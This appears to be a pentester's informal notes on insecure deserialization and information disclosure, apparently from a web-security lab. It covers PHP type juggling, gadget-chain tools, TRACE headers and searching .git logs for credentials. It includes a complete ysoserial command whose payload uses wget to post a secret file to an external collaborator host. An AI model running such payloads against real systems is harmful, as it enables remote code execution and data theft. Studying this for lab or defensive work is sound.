Insecure Deserialization Tips / Information Disclosure

Look at the cookie session, sometimes you can modified value inside to get privelege escaltion or you can exploit the back-end language system.
An example could be with PHP vulnerabilities, when it compares string with 0 number https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09


In other cases you need to use gadject chain in order to make some action into the Back-end
Using some repository such as:

https://github.com/ambionics/phpggc for PHP

https://github.com/frohoff/ysoserial for JAVA deserialization

Or even with Ruby

https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html

In other scenario, try to use TRACE to see all header used by the request, here you can find some hidden header useful

Take a look into ../.git
Sometimes lanch git diff 00a0s.. 990aòòò to see if there is some credentials leak, you can have a look in the file .git/logs/HEAD or similar


Possible payload to retrive file from JAVA deserialization vulnerabilities 

 --post-data=string
       --post-file=file
           Use POST as the method for all HTTP requests and send the specified data
           in the request body.  --post-data sends string as data, whereas
           --post-file sends the contents of file.  Other than that, they work in
           exactly the same way. In particular, they both expect content of the
           form "key1=value1&key2=value2", with percent-encoding for special
           characters; the only difference is that one expects its content as a
           command-line parameter and the other accepts its content from a file. In
           particular, --post-file is not for transmitting files as form
           attachments: those must appear as "key=value" data (with appropriate
           percent-coding) just like everything else. Wget does not currently
           support "multipart/form-data" for transmitting POST data; only
           "application/x-www-form-urlencoded". Only one of --post-data and
           --post-file should be specified.
           
java -jar ysoserial-master-d367e379d9-1.jar CommonsCollections5 'wget --post-file /home/carlos/secret 57atjr760eg9rmvtk7hwu2ho4fa68ux.burpcollaborator.net' | gzip -f | base64 -w0

THere are various payload to use and also command

like 'cat /home/carlos/secret' when you want to retrive the file output and it's reflected into the response of the HTTP request.
